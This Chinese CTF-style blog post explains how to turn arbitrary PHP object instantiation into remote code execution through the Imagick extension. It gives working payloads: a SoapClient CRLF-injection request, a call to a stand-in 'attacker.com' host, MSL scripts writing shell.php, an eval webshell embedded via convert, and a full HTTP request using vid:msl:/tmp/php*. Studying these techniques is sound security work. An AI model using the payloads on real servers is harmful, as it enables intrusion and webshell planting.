@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言magick拓展的打法，建议看看 特征 存在此拓展之时，往往会留一个phpinfo等待查看 存在如下代码  123456789&lt;?php$class &#x3D; $_REQUEST[&#x27;class&#x27;];$arg &#x3D; $_REQUEST[&#x27;arg&#x27;];new $class($arg);?&gt;or$a &#x3D; new ReflectionClass($_GET[">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php-imagick拓展相关打法">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言magick拓展的打法，建议看看 特征 存在此拓展之时，往往会留一个phpinfo等待查看 存在如下代码  123456789&lt;?php$class &#x3D; $_REQUEST[&#x27;class&#x27;];$arg &#x3D; $_REQUEST[&#x27;arg&#x27;];new $class($arg);?&gt;or$a &#x3D; new ReflectionClass($_GET[">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-12-08T10:51:55.000Z">
+<meta property="article:modified_time" content="2025-12-08T10:53:01.397Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>php-imagick拓展相关打法</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/%E5%9B%BD%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E4%B8%80%E6%AC%A1%E5%85%B8%E5%9E%8Bxss%E7%9A%84%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&text=php-imagick拓展相关打法"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&is_video=false&description=php-imagick拓展相关打法"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php-imagick拓展相关打法&body=Check out this article: https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&name=php-imagick拓展相关打法&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&t=php-imagick拓展相关打法"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">1.1.</span> <span class="toc-text">特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.2.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POD"><span class="toc-number">1.3.</span> <span class="toc-text">POD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-SimpleXMLElement-XXE"><span class="toc-number">1.4.</span> <span class="toc-text">SoapClient&#x2F;SimpleXMLElement XXE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83"><span class="toc-number">2.1.</span> <span class="toc-text">核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSL-Format"><span class="toc-number">2.2.</span> <span class="toc-text">MSL Format</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E6%B4%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">简洁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VID-Scheme"><span class="toc-number">2.2.3.</span> <span class="toc-text">VID Scheme</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        php-imagick拓展相关打法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-12-08T10:51:55.000Z" class="dt-published" itemprop="datePublished">2025-12-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/php/">php</a> › <a class="category-link" href="/categories/php/imagick/">imagick</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>magick拓展的打法，建议看看</p>
+<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul>
+<li>存在此拓展之时，往往会留一个phpinfo等待查看</li>
+<li>存在如下代码</li>
+</ul>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?<span class="type">php</span></span><br><span class="line"><span class="variable">$class</span> <span class="operator">=</span> $_REQUEST[<span class="string">&#x27;class&#x27;</span>];</span><br><span class="line">$arg = $_REQUEST[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">$class</span>($arg);</span><br><span class="line">?&gt;</span><br><span class="line"><span class="type">or</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>($_GET[<span class="string">&#x27;cloversec&#x27;</span>]);</span><br><span class="line">$b = $a-&gt;newInstanceArgs($_GET[<span class="string">&#x27;ctf&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
+<p>当然，如果题目给了这个我们能做些什么呢？<br>这自然涉及到了<code>built-in PHP classes </code><br>所有的内置类可以通过此代码查询</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_declared_classes</span>());</span><br></pre></td></tr></table></figure></div>
+<p>这里再介绍一个绝招，可看这个地方<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/book.reflection.php">https://www.php.net/manual/en/book.reflection.php</a><br>这里的Reflection类，当我们可以控制new时，且后续存在一些可控的手段，会有不少的方法去实现RCE，就像如下所说</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">If you control multiple constructor parameters and can call arbitrary methods afterwards, there are many ways to get a Remote Code Execution. </span><br><span class="line">But <span class="keyword">if</span> you can pass only one parameter and don’t have any calls to the created object, there is almost nothing.</span><br></pre></td></tr></table></figure></div>
+<p>所以在这里，接着这个拓展的引子，我们稍微学一下该情况下的打法<br>当然，此前我们会利用到的一些内置类如下<br><a target="_blank" rel="noopener" href="https://www.extrader.top/posts/35c0085d/#%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB">https://www.extrader.top/posts/35c0085d/#%E5%8F%AF%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%B1%BB</a></p>
+<p>除了关注一些读文件，列目录的原生类，也可以看一下比如xss的，删除文件的相关原生类打法</p>
+<h3 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h3><p> 扩展  </p>
+<p>还记得</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">SplFileObject</span>(<span class="string">&#x27;http://attacker.com/&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>对于这个类我们了解，它不止是简单发包，更是可以控制整个请求包，假如内网有Redis服务且泄露密钥，可以执行RCE写马，不过记忆里，好像必须执行一个不存在的方法来着？<br>这里有一个例子</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="title function_">if</span><span class="params">($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]==<span class="string">&#x27;127.0.0.1&#x27;</span>)</span>&#123;</span><br><span class="line">    <span class="meta">@$a</span>=$_POST[<span class="number">1</span>];</span><br><span class="line">    <span class="meta">@eval($a)</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">$target= <span class="string">&#x27;http://127.0.0.1/demo.php&#x27;</span>;</span><br><span class="line">$post_string= <span class="string">&#x27;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&#x27;</span>;</span><br><span class="line">$headers= array(</span><br><span class="line">   <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Cookie:admin=1&#x27;</span></span><br><span class="line">   );</span><br><span class="line">$b= <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,array(<span class="string">&#x27;location&#x27;</span>=&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type:application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length:&#x27;</span>.(string)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"><span class="comment">//因为User-agent是可以控制的，因此可以利用crlf注入http头部发送post请求</span></span><br><span class="line">$aaa= serialize($b);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&#x27;%0d%0a&#x27;</span>,$aaa);</span><br><span class="line">$aaa= str_replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;%26&#x27;</span>,$aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line"></span><br><span class="line">$x= unserialize(urldecode($aaa));<span class="comment">//调用__call方法触发网络请求发送</span></span><br><span class="line">$x-&gt;no_func();</span><br></pre></td></tr></table></figure></div>
+
+<p>我们简单测试一下构造函数</p>
+<p>是可行的，但应该无法实现上述crlf攻击，只是简单一个get请求</p>
+<p>这种情况下，还可以有一种打法，就是触发phar而进行反序列化 <code>SSRFs in PHP &lt; 8.0 could be turned into deserializations via techniques with the Phar protocol.  </code></p>
+<h3 id="POD"><a href="#POD" class="headerlink" title="POD"></a>POD</h3><p> 扩展  </p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-pdo.html">https://www.runoob.com/php/php-pdo.html</a><br>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。<br>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。<br>PDO随PHP5.1发行，在PHP5.0的PECL扩展中也可以使用，无法运行于之前的PHP版本。<br>这里</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;sqlite:/tmp/test.txt&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p> PDO构建器接受DSN字符串，允许我们通过安装的数据库扩展连接到任何本地或远程数据库。例如，SQLite 扩展可以创建空文件。  </p>
+<h3 id="SoapClient-SimpleXMLElement-XXE"><a href="#SoapClient-SimpleXMLElement-XXE" class="headerlink" title="SoapClient&#x2F;SimpleXMLElement XXE"></a><strong>SoapClient&#x2F;SimpleXMLElement XXE</strong></h3><p><code>In PHP ≤ 5.3.22 and ≤ 5.4.12, the constructor of SoapClient was vulnerable to XXE. The constructor of SimpleXMLElement was vulnerable to XXE as well, but it required libxml2 &lt; 2.9. </code></p>
+<h2 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></li>
+</ul>
+<p>务必牢记，此心法首要为imagick拓展，然后续变化万千 </p>
+<p>这里也提一句，用Imagick去读文件可以绕过 open_basedir  ,因为它的底层实现并不在php</p>
+<h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>最简单的类同SoapClient，我们可以ssrf</p>
+<p>但是自然不会止步于此，我们可以看看其他东西 <code>if you could pass values such as “epsi:/local/path” or “msl:/local/path” to ImageMagick, it would use their scheme part, e.g., epsi or msl, to determine the file format.  </code></p>
+<h3 id="MSL-Format"><a href="#MSL-Format" class="headerlink" title="MSL Format"></a>MSL Format</h3><h4 id="简洁"><a href="#简洁" class="headerlink" title="简洁"></a>简洁</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MSL全称是Magick Scripting Language</span><br><span class="line">是ImageMagick自创的一门基于XML的“语言”，旨在用户可以通过XML的方式编写代码，处理图片。</span><br><span class="line">其实就是可以利用一系列约定俗成的标签和属性来对图片进行处理。</span><br></pre></td></tr></table></figure></div>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MSL stands <span class="keyword">for</span> Magick Scripting Language. </span><br><span class="line">It’s a built-in ImageMagick language that facilitates the reading of images, performance of image processing tasks, and writing of results back to the filesystem.  </span><br></pre></td></tr></table></figure></div>
+<p>关键就是一个read一个write， 有两个标签<read>和<write>可以用于读取和写入文件，所以这个Trick的核心就是利用这两个标签写入任意文件Webshell。  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=<span class="string">&quot;https://placehold.co/100.png&quot;</span>/&gt;</span><br><span class="line">  &lt;write filename=<span class="string">&quot;shell.php&quot;</span> /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure></div>
+<p>会把远程的图片转成当前的shell.php<br>但是ImageMagick在处理图片后，会导致丢失原始图片中的信息，所以使用图片马是无法成功写入Webshell的。 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">要解决这个问题也很简单，既然MSL是一门图片处理语言，我们就可以找找是否有方法在图片中增加一些“注释”。</span><br><span class="line">msl有一个&lt;comment&gt;标签可以给生成的图片加注释，所以我们将Webshell编码后放在这个标签里即可  </span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">  &lt;read filename=<span class="string">&quot;hxxp://placehold.co/100.png&quot;</span>/&gt;</span><br><span class="line">  &lt;comment&gt;HTML实体编码后的Webshell&lt;/comment&gt;</span><br><span class="line">  &lt;write filename=<span class="string">&quot;shell.php&quot;</span> /&gt;</span><br><span class="line">&lt;/image&gt;</span><br></pre></td></tr></table></figure></div>
+<p>但是直接如下也不是不行（maybe）</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onvert xc:red -set <span class="string">&#x27;Copyright&#x27;</span> <span class="string">&#x27;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#x27;</span> positive.png</span><br></pre></td></tr></table></figure></div>
+
+<p>但其实关于作者<code>Imagick’s Path Parsing</code>的内容，我没太看明白，不过不影响我们的rce打法</p>
+<p>嗯，现在的关键就是如何上传msl脚本了吧？这里要用到临时文件，这里作者给了几个方法，其中之一就是超级爆破，这个不说了，不过作者的一些前置处理值得学习</p>
+<h4 id="VID-Scheme"><a href="#VID-Scheme" class="headerlink" title="VID Scheme"></a>VID Scheme</h4><p>这里可以用这个协议，使得可以利用通配符（这种临时文件的实现也体现在RCE绕过等等方面，比如如下的史诗级payload<code>&lt;?=</code>. &#x2F;t*&#x2F;*<code>;  </code></p>
+<p><code>class=Imagick&amp;arg=vid:msl:/tmp/php*</code></p>
+<p>甚至不止于此，若题目不出网，我们可以直接</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /?class=Imagick&amp;arg=vid:msl:/tmp/php* HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8080</span></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en-US;q=0.9,en;q=0.8</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP</span></span><br><span class="line"><span class="comment">Content-Length: 332</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryTrWYaXKoVR1wiLhP</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;vulhub.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: text/plain</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment">  &lt;read filename=&quot;caption:&amp;lt;?=phpinfo();?&amp;gt;&quot;/&gt;</span></span><br><span class="line"><span class="comment">  &lt;write filename=&quot;info:shell.php&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">------WebKitFormBoundaryTrWYaXKoVR1wiLhP--</span></span><br></pre></td></tr></table></figure></div>
+
+<p>不过caption的使用依托于题目具体环境，有时候这个协议可能无法使用</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>铸剑杯线下的考点，可惜我之前没听说过，感觉这样直接实现RCE？不过当时题目应该预期（或者也确实只能）上传文件，再通过某种方式拿到secret，进行劫持，这个洞vulhub是可以直接复现的</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
